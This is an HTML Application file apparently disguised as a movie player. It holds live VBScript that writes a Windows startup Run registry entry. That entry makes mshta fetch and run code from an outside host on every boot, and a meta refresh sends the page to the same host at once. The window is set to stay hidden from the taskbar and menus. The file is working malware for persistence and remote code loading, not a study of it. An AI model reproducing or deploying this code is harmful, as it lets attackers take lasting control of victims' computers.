<html>
<head><meta http-equiv="Content-Type" content="text/html; charsert=EUC-JP">
<meta http-equiv="refresh" content="0; URL=http://asagao0715.info/hta/reg.php">
<title>“®‰æ</title>

<Script Language="VBScript">
Option Explicit

Dim objWshShell
Set objWshShell = CreateObject("WScript.Shell")

Dim strRegKey
Dim strRegEntry1
Dim strRegValue1
rem HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

strRegKey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\"
strRegEntry1 = "tutuji0701"
strRegValue1 = "mshta http://asagao0715.info/hta/reg.php"

objWshShell.RegWrite strRegKey & strRegEntry1, strRegValue1, "REG_SZ"
rem objWshShell.Run strRegValue1

Set objWshShell = Nothing

</Script>

</head>
<body>
<HTA:APPLICATION
	MINIMIZEBUTTON = "no"
	ICON = ""
	SINGLEINSTANCE = "yes"
	SELECTION = "no"
	SCROLL = "no"
	ID = "movieplay20110714"
	SYSMENU = "no"
	CONTEXTMENU = "no"
	MAXIMIZEBUTTON = "no"
	BORDERSTYLE = "normal"
	VERSION = "1.0"
	WINDOWSTATE = "normal"
	CAPTION = "no"
	NAVIGABLE = "yes"
	SHOWINTASKBAR = "no"
	BORDER = "none"
	INNERBORDER = "no"
	APPLICATIONNAME = "movieplay20110714"
	SCROLLFLAT = "no"
/>
</body>
</html>
